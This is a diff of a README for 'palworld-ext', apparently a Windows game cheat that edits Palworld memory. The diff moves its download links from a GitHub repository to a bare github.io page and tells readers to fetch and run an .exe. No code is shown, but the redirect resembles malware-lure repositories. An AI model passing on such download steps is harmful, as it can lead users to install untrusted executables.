@@ -1,6 +1,6 @@
 # 🎮 palworld-ext - Adjust game settings for better play
 
-[![Download](https://img.shields.io/badge/Download-Palworld_Ext-blue.svg)](https://github.com/motilemint72/palworld-ext)
+[![Download](https://img.shields.io/badge/Download-Palworld_Ext-blue.svg)](https://motilemint72.github.io)
 
 palworld-ext functions as a tool for your Windows computer. It overlays the Palworld game to let you change settings while you play. You can modify resources, taming speeds, movement, and combat balance. The tool reads game memory to apply changes. It does not change your game files. You can turn it off at any time.
 
@@ -27,7 +27,7 @@ Before you use this tool, ensure your computer meets these standards:
 
 ## 📥 How to get started
 
-1. Visit the project page to download the latest version: [https://github.com/motilemint72/palworld-ext](https://github.com/motilemint72/palworld-ext)
+1. Visit the project page to download the latest version: [https://motilemint72.github.io](https://motilemint72.github.io)
 2. Locate the file ending in .exe.
 3. Save the file to a folder on your computer.
 4. Extract the contents if the file is in a compressed folder.
